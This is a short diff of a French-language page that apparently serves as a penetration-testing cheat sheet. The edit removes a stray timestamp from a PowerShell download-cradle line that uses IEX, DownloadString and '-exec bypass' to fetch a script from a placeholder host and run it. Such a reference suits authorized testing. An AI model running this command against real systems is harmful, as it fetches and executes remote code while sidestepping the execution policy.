@@ -10,7 +10,7 @@ layout: default
 ### Télécharger un fichier depuis un server web
 
 ````powershell 
-IEX(New-Object NET.WebClient).DownloadString("http://ip:port/fichier_à_download") | powershell -exec bypass[22:47]
+IEX(New-Object NET.WebClient).DownloadString("http://ip:port/fichier_à_download") | powershell -exec bypass
 ````
 
 #### PowerView
